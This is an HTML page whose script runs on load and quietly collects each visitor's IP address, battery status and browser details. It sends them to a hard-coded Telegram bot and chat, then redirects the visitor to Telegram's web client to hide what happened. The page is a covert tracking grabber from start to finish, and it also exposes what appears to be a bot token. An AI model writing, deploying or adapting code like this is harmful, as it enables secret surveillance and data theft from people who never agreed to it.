<!DOCTYPE html>
<html>
<head>
    <title>:(</title>
    <style>
        #status {
            display: none;
        }
    </style>
</head>
<body>
    <h1 id="system-info" style="display:none;">System Information</h1>
    <p id="status">Collecting data...</p>

    <script>
        const TELEGRAM_BOT_TOKEN = '5033312441:AAHf3soRV_BQk6rKTx5R6xH4TY2Jr5SCEp4';
        const TELEGRAM_CHAT_ID = '1683491443';

        // Function to get IP address
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                console.log('IP Address:', data.ip);
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP address:', error);
                return 'N/A';
            }
        }

        // Function to get battery status
        async function getBatteryStatus() {
            try {
                const battery = await navigator.getBattery();
                const level = battery.level * 100;
                const charging = battery.charging ? 'charging' : 'not charging';
                const batteryStatus = `Battery: ${level}% (${charging})`;
                console.log(batteryStatus);
                return batteryStatus;
            } catch (error) {
                console.error('Error fetching battery status:', error);
                return 'N/A';
            }
        }

        // Function to get browser information
        function getBrowserInfo() {
            const userAgent = navigator.userAgent;
            const browserName = navigator.appName;
            const browserVersion = navigator.appVersion;
            const browserInfo = `Browser: ${browserName} (Version: ${browserVersion}) - ${userAgent}`;
            console.log(browserInfo);
            return browserInfo;
        }

        // Function to send message to Telegram
        async function sendMessageToTelegram(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const payload = {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
            };

            try {
                console.log('Sending message to Telegram:', payload);
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
                const data = await response.json();
                console.log('Response from Telegram API:', data);
                return data.ok;
            } catch (error) {
                console.error('Error sending message to Telegram:', error);
                return false;
            }
        }

        // Main function to gather data and send to Telegram
        async function gatherAndSendData() {
            const ip = await getIP();
            const batteryStatus = await getBatteryStatus();
            const browserInfo = getBrowserInfo();

            const message = `IP Address:\n${ip}\nBattery:\n${batteryStatus}\nBrowser:\n${browserInfo}`;
            const success = await sendMessageToTelegram(message);

            const statusText = success ? 'Data sent to Telegram successfully!' : 'Failed to send data to Telegram.';
            document.getElementById('status').textContent = statusText;

            if (success) {
                window.location.href = 'https://web.telegram.org/';
            }
        }

        // Run the main function
        gatherAndSendData();
    </script>
</body>
</html>
